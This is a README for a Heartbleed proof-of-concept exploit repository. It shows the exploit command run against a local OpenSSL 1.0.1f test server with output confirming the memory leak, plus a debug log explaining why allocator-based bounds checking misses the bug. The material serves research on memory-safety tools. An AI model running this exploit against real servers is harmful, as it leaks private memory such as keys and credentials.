Heartbleed PoC
===========

This is the Heartbleed PoC, adapted from [mpgn's initial version](https://github.com/mpgn/heartbleed-PoC) and [SASIN83's fork](https://github.com/SASIN83/heartbleed-PoC/tree/patch-1). Notable changes:

* Tested with Python 3.10
* Removed dependency on pyfancy. Now this POC requires no extra package.

Example run:

Client:

```
python3 ./heartbleed-exploit.py localhost 4433
Connecting localhost at port 4433
Sending Client Hello...
 ... received message: type = 22, ver = 0302, length = 66
 ... received message: type = 22, ver = 0302, length = 947
 ... received message: type = 22, ver = 0302, length = 331
 ... received message: type = 22, ver = 0302, length = 4
Handshake done...
Sending heartbeat request with length 4:
 ... received message: type = 24, ver = 0302, length = 16384
Received heartbeat response in file out.txt
WARNING: server returned more data than it should - server is vulnerable!
```

Server:

```
# generate key.pem and cert.pem first
openssl-1.0.1f/apps$ ./openssl s_server -key key.pem -cert cert.pem -accept 4433 -www
WARNING: can't open config file: /usr/local/ssl/openssl.cnf
Using default temp DH parameters
Using default temp ECDH parameters
ACCEPT
read R BLOCK
140010939967168:error:140940E5:SSL routines:SSL3_READ_BYTES:ssl handshake failure:s3_pkt.c:989:
ACCEPT
```

# Notes about using this POC to test spatial memory safety protection

If you have a tool that instrument runtime checks into C programs and you want to validate it using Heartbleed (this was my motivation to update this exploit), please double check if its implementation can catch the bug in theory. Essentially, OpenSSL allocates a big buffer (e.g., 17.3KB) for incoming messages, and messages are read and stored in this buffer. If the tool retrieve object bounds from allocator calls (e.g., malloc()), pointers to message body will have the bounds of the entire buffer. Therefore, this POC would NOT trigger runtime check failures unless there are enough messages received.

My debug log for troubleshooting missed detection: (edited for readability)
```
// int BIO_read(BIO *b, void *out, int outl);
// site [20508]:  at openssl-1.0.1f/ssl/s3_pkt.c: 239:  i=BIO_read(s->rbio,pkt+len+left, max-left);
// site [119220]: at openssl-1.0.1f/ssl/t1_lib.c: 2586: <check for memcpy at that line>
// columns: EventID [SiteID] EventName <details>...
5833622:  [20508] BIO_read {/*b*/0x562aea4b6ba0, /*out*/0x562aea4c75ce, /*outl*/214}, bounds for out: [0x562aea4c75c0, 0x562aea4cbb08]
16866085: [20508] BIO_read {/*b*/0x562aea4b6ba0, /*out*/0x562aea4c75c3, /*outl*/5},   bounds for out: [0x562aea4c75c0, 0x562aea4cbb08]
16866267: [20508] BIO_read {/*b*/0x562aea4b6ba0, /*out*/0x562aea4c75c8, /*outl*/3},   bounds for out: [0x562aea4c75c0, 0x562aea4cbb08]
16866529: [119220] check {addr=0x562aea4c75cb, bounds=[0x562aea4c75c0, 0x562aea4cbb08], len=16384}
```
To stop heartbleed, the last check must fail. However, it is passing because the bounds cover the entire buffer instead of just the malicious message.
